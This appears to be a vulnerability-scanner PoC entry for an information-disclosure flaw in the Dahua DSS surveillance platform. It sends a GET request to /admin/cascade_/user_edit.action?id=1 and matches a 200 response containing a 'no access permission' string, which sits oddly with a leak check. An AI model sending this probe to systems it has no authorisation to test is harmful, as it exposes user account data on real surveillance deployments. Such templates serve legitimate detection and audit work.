{
        'name': '大华 DSS 数字监控系统 user_edit.action 信息泄露漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/admin/cascade_/user_edit.action?id=1',
            'headers': {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': '无访问权限'
        }}]
    }